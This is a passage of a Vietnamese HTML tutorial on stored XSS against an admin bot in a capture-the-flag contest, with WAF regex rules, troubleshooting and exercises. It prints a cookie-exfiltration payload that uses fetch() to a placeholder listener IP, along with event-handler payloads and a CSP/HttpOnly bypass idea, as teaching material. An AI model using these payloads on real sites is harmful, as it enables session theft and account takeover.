+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service "Feedback Board": gửi feedback, có nút "Notify admin to review" — rõ ràng cơ chế admin bot.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận XSS</div><div class="d">Gửi feedback <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, mở link xem feedback bằng trình duyệt thật → popup alert hiện ra ⟹ stored XSS xác nhận.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Dựng listener</div><div class="d">Chạy <code>python3 -m http.server 8000</code> trên máy mình (IP trong mạng thi: <code>10.10.X.X</code>).</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Gửi payload thật</div><div class="d">Gửi feedback mới: <code>&lt;script&gt;fetch('http://10.10.X.X:8000/?c='+document.cookie)&lt;/script&gt;</code>, lấy URL feedback này, "Notify admin" với đúng URL đó.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Nhận flag</div><div class="d">Vài giây sau, terminal listener in ra <code>GET /?c=session%3DFHACKER2026%7B...%7D</code> ⟹ cookie admin chứa flag trực tiếp (hoặc dùng cookie đó gọi <code>/admin</code> để lấy flag nếu flag không nằm thẳng trong cookie).</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex)</th><th>Khớp gì</th></tr>
+    <tr><td><code>(?i)&lt;script[\s>]</code></td><td>Thẻ script, không phân biệt hoa thường</td></tr>
+    <tr><td><code>(?i)on(error|load|toggle|click)\s*=</code></td><td>Event handler phổ biến dùng trong XSS</td></tr>
+    <tr><td><code>(?i)&lt;(img|svg|body|details)[^>]*on\w+=</code></td><td>Thẻ hay bị lợi dụng kèm theo event handler</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Nếu chức năng bình luận hợp lệ cho phép định
+  dạng HTML (hiếm, nhưng có thể) thì rule này sẽ chặn nhầm. Đa số trường hợp bình luận/input text thường, không
+  có lý do hợp lệ chứa thẻ <code>&lt;script&gt;</code> — rủi ro chặn nhầm ở đây tương đối thấp. Test DetectionOnly
+  trước vẫn là bắt buộc.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi không nhận được dữ liệu từ bot</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Alert hiện khi TỰ xem trang, nhưng báo cho bot không có gì trả về</td><td>Bot không có route mạng tới IP bạn (firewall giữa mạng các đội), hoặc report URL sai</td><td>Hỏi BTC về connectivity của bot; kiểm tra lại đúng format URL report yêu cầu (một số challenge yêu cầu URL đầy đủ domain, không chỉ path)</td></tr>
+    <tr><td>CSP (Content-Security-Policy) chặn <code>fetch()</code> ra ngoài domain lạ</td><td>Header <code>Content-Security-Policy: connect-src 'self'</code> chỉ cho fetch về cùng domain</td><td>Không exfiltrate ra ngoài được — chuyển sang cách C mục 06 (thực hiện hành động ngay trong domain, vd tự submit form lộ flag ra chỗ bạn đọc được)</td></tr>
+    <tr><td>Payload bị encode thành <code>&amp;lt;script&amp;gt;</code>, không chạy</td><td>App có escape đúng — không phải XSS ở đây</td><td>Tìm input khác, hoặc tìm DOM-based XSS (JS phía client tự xử lý <code>location.hash</code> không an toàn, không qua server escape)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App in input ra HTML không escape (hoặc escape thiếu 1 số ký tự), VÀ có cơ chế admin bot/nạn nhân xem trang đó.</td></tr>
+    <tr><td>❌</td><td>App escape đúng mọi ký tự HTML đặc biệt (<code>&lt; &gt; &amp; " '</code>) trước khi in ra.</td></tr>
+    <tr><td>❌</td><td>Không có cơ chế admin bot/nạn nhân nào — XSS chỉ chạy được trên trình duyệt của chính bạn, vô dụng vì bạn tự có toàn quyền với session của mình rồi.</td></tr>
+    <tr><td>❌</td><td>Có CSP nghiêm ngặt (<code>script-src 'self'</code>, không <code>unsafe-inline</code>) — payload inline script bị chặn hoàn toàn trước khi chạy.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay, từ gõ bình luận thường tới khi nhận được cookie qua
+  listener.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Luôn tự mở lại trang bằng trình duyệt thật để xác nhận alert chạy —
+  đừng chỉ tin vào việc Burp hiển thị thẻ script nguyên văn trong Response.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> app chặn thẻ <code>&lt;script&gt;</code> và <code>img</code>. Tìm thẻ HTML
+  khác kèm event handler vẫn chạy được JavaScript.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Thử <code>&lt;svg onload=...&gt;</code> hoặc <code>&lt;body onload=...&gt;</code>
+  (nếu payload chèn được ngay trong thẻ body) — xem mục 06.B.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> cookie session có <code>HttpOnly</code>, CSP chặn <code>connect-src</code>
+  ra ngoài domain. Thiết kế cách vẫn lấy được flag mà không cần đọc cookie hay fetch ra ngoài.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng script để tự thực hiện 1 hành động ngay trong domain đó (vd
+  submit 1 form "share this page publicly" thay bot) — biến flag từ "chỉ admin xem được" thành "công khai", rồi
+  bạn đọc lại bằng request bình thường không cần XSS nữa.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>DOM</td><td>Cấu trúc cây các phần tử HTML mà JavaScript thao tác được trong trình duyệt.</td></tr>
+    <tr><td>Admin bot</td><td>Chương trình tự động (giả lập trình duyệt) BTC chạy để "thay admin" xem URL thí sinh gửi.</td></tr>
+    <tr><td>Exfiltrate (exfil)</td><td>Gửi dữ liệu thu được (cookie, nội dung trang) ra ngoài tới nơi kẻ tấn công kiểm soát.</td></tr>
+    <tr><td>CSP (Content-Security-Policy)</td><td>Header HTTP giới hạn trình duyệt chỉ được chạy/tải script, kết nối theo danh sách cho phép — 1 lớp phòng thủ chống XSS.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/XSS Injection/</code>, <code>~/hoc/CTF/Tools/web/SecLists/Fuzzing/XSS/</code>,
+  Python <code>http.server</code> (có sẵn, dùng làm listener).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("xss-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("xss-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
